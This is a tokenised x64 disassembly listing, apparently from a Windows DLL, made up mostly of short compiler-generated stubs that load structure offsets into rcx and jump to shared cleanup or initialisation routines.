mov rcx [ rdx + 0x28 ]
jmp sub_180003e40
sub_18002c220
lea rcx [ rdx + 0x140 ]
jmp sub_180001f50
sub_18002c230
lea rcx [ rdx + 0x40 ]
jmp sub_180003d20
sub_18002c240
lea rcx [ rdx + 0x168 ]
jmp sub_180001f50
sub_18002c250
lea rcx [ rdx + 0x190 ]
jmp sub_180001f50
sub_18002c260
lea rcx [ rdx + 0x1b8 ]
jmp sub_180001f50
sub_18002c270
lea rcx [ rdx + 0x168 ]
jmp sub_180001f50
sub_18002c280
mov rcx [ rdx + 0x68 ]
jmp j_sub_180018b3c
sub_18002c290
mov rcx [ rdx + 0x60 ]
jmp sub_180001f50
sub_18002c2a0
lea rcx [ rdx + 0xe8 ]
jmp sub_180001f50
sub_18002c2b0
lea rcx [ rdx + 0x110 ]
jmp sub_180001f50
sub_18002c2c0
lea rcx [ rdx + 0x38 ]
jmp j_sub_180002330
sub_18002c2d0
lea rcx [ rdx + 0x160 ]
jmp sub_180001f50
sub_18002c2e0
lea rcx [ rdx + 0x70 ]
jmp j_sub_180002330
sub_18002c2f0
lea rcx [ rdx + 0x160 ]
jmp sub_180001f50
sub_18002c300
lea rcx [ rdx + 0x138 ]
jmp sub_180001f10
sub_18002c310
lea rcx [ rdx + 0x2b0 ]
jmp sub_180001f50
sub_18002c320
lea rcx [ rdx + 0x288 ]
jmp sub_180001f50
sub_18002c330
lea rcx [ rdx + 0x260 ]
jmp sub_180001f50
sub_18002c370
lea rcx [ rdx + 0x80 ]
add rcx 0x8
jmp sub_180003d80
sub_18002c380
mov rcx [ rdx + 0x2d8 ]
jmp sub_180003e40
sub_18002c390
lea rcx [ rdx + 0x80 ]
jmp sub_180009d40
sub_18002c3d0
lea rcx [ rdx + 0x170 ]
add rcx 0x8
jmp sub_180003d80
sub_18002c3e0
mov rcx [ rdx + 0x2e0 ]
jmp sub_180003e40
sub_18002c3f0
lea rcx [ rdx + 0x170 ]
jmp sub_180009d40
sub_18002c400
lea rcx [ rdx + 0x148 ]
jmp sub_180001f50
sub_18002c410
lea rcx [ rdx + 0x170 ]
jmp sub_180001f50
sub_18002c420
lea rcx [ rdx + 0x198 ]
jmp sub_180001f50
sub_18002c430
lea rcx [ rdx + 0x30 ]
jmp sub_180009d40
sub_18002c440
lea rcx [ rdx + 0x30 ]
jmp sub_180003d20
sub_18002c450
lea rcx [ rdx + 0x30 ]
jmp sub_180003d20
sub_18002c460
lea rcx [ rdx + 0x130 ]
jmp sub_180001f50
sub_18002c4a0
lea rcx [ rdx + 0x40 ]
add rcx 0x8
jmp sub_180003d80
sub_18002c4b0
mov rcx [ rdx + 0x3e0 ]
jmp sub_180003e40
sub_18002c4c0
lea rcx [ rdx + 0x40 ]
jmp sub_180009d40
sub_18002c500
lea rcx [ rdx + 0x130 ]
add rcx 0x8
jmp sub_180003d80
sub_18002c510
mov rcx [ rdx + 0x3e8 ]
jmp sub_180003e40
sub_18002c520
lea rcx [ rdx + 0x130 ]
jmp sub_180009d40
sub_18002c560
lea rcx [ rdx + 0x230 ]
add rcx 0x8
jmp sub_180003d80
sub_18002c570
mov rcx [ rdx + 0x3f0 ]
jmp sub_180003e40
sub_18002c580
lea rcx [ rdx + 0x230 ]
jmp sub_180009d40
sub_18002c590
lea rcx [ rdx + 0x340 ]
jmp sub_180001f50
sub_18002c5a0
lea rcx [ rdx + 0x368 ]
jmp sub_180001f50
sub_18002c5b0
lea rcx [ rdx + 0x368 ]
jmp sub_180001f50
sub_18002c5c0
lea rcx [ rdx + 0x390 ]
jmp sub_180001f50
sub_18002c5d0
lea rcx [ rdx + 0x3b8 ]
jmp sub_180001f50
sub_18002c5e0
lea rcx [ rdx + 0x340 ]
jmp sub_180001f50
sub_18002c5f0
lea rcx [ rdx + 0x60 ]
jmp sub_180003d20
sub_18002c600
lea rcx [ rdx + 0x278 ]
jmp sub_180001f50
sub_18002c610
lea rcx [ rdx + 0x1d8 ]
jmp sub_180001f50
sub_18002c620
lea rcx [ rdx + 0x188 ]
jmp sub_180001f50
sub_18002c630
lea rcx [ rdx + 0x200 ]
jmp sub_180001f50
sub_18002c640
lea rcx [ rdx + 0x250 ]
jmp sub_180001f50
sub_18002c650
lea rcx [ rdx + 0x1b0 ]
jmp sub_180001f50
sub_18002c660
lea rcx [ rdx + 0x228 ]
jmp sub_180001f50
sub_18002c670
lea rcx [ rdx + 0x160 ]
jmp sub_180001f50
sub_18002c680
mov rcx [ rdx + 0x368 ]
jmp sub_180001f50
sub_18002c690
mov rcx [ rdx + 0x360 ]
jmp sub_180001f50
sub_18002c6a0
lea rcx [ rdx + 0x3a0 ]
jmp sub_18000a420
sub_18002c6e0
lea rcx [ rdx + 0x250 ]
add rcx 0x8
jmp sub_180003d80
sub_18002c6f0
mov rcx [ rdx + 0x7d0 ]
jmp sub_180003e40
sub_18002c700
lea rcx [ rdx + 0x250 ]
jmp sub_180009d40
sub_18002c710
lea rcx [ rdx + 0x370 ]
jmp sub_180001f50
sub_18002c750
lea rcx [ rdx + 0x60 ]
add rcx 0x8
jmp sub_180003d80
sub_18002c760
mov rcx [ rdx + 0x7d8 ]
jmp sub_180003e40
sub_18002c770
lea rcx [ rdx + 0x60 ]
jmp sub_180009d40
sub_18002c780
lea rcx [ rdx + 0x370 ]
jmp sub_180001f50
sub_18002c7c0
lea rcx [ rdx + 0x150 ]
add rcx 0x8
jmp sub_180003d80
sub_18002c7d0
mov rcx [ rdx + 0x7e0 ]
jmp sub_180003e40
sub_18002c7e0
lea rcx [ rdx + 0x150 ]
jmp sub_180009d40
sub_18002c7f0
lea rcx [ rdx + 0x370 ]
jmp sub_180001f50
sub_18002c7fc
lea rcx [ sub_18002c884 ]
jmp sub_18001a3a8
sub_18002c808
lea rcx [ sub_18002c894 ]
jmp sub_18001a3a8
sub_18002c814
lea rcx [ sub_18002c8a4 ]
jmp sub_18001a3a8
sub_18002c820
lea rcx [ sub_18002c8c0 ]
jmp sub_18001a3a8
sub_18002c82c
lea rcx [ sub_18002c8b4 ]
jmp sub_18001a3a8
sub_18002c838
sub rsp 0x28
lea rcx [ rw-data ]
call sub_1800176d4
lea rcx [ sub_18002c914 ]
add rsp 0x28
jmp sub_18001a3a8
sub_18002c858
sub rsp 0x28
lea rcx [ rw-data ]
call sub_1800176d4
lea rcx [ sub_18002c920 ]
add rsp 0x28
jmp sub_18001a3a8
sub_18002c878
lea rcx [ sub_18002c92c ]
jmp sub_18001a3a8
sub_18002c884
lea rax [ r--data ]
mov [ rw-data ] rax
retn
sub_18002c894
lea rax [ r--data ]
mov [ rw-data ] rax
retn
sub_18002c8a4
lea rax [ r--data ]
mov [ rw-data ] rax
retn
sub_18002c8b4
lea rcx [ rw-data ]
jmp sub_180003170
sub_18002c914
lea rcx [ rw-data ]
jmp sub_180017720
sub_18002c920
lea rcx [ rw-data ]
jmp sub_180017720
sub_18002c968
lea rax [ r--data ]
lea rcx [ rw-data ]
mov [ rw-data ] rax
jmp sub_1800185c4
